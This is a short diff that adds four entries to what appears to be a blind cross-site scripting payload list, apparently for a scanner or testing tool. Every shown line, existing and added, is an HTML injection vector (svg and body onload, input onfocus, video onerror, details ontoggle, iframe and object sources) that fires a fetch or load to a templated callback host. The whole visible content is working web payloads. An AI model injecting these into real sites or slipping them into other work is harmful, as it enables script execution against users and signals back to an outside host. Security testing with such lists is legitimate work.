@@ -5,3 +5,7 @@
 <svg onload="fetch('{{CALLBACK}}')">
 <input onfocus="fetch('{{CALLBACK}}')" autofocus>
 <iframe src="{{CALLBACK}}">
+<video src=x onerror="fetch('{{CALLBACK}}')">
+<body onload="fetch('{{CALLBACK}}')">
+<details open ontoggle="fetch('{{CALLBACK}}')">
+<object data="{{CALLBACK}}">
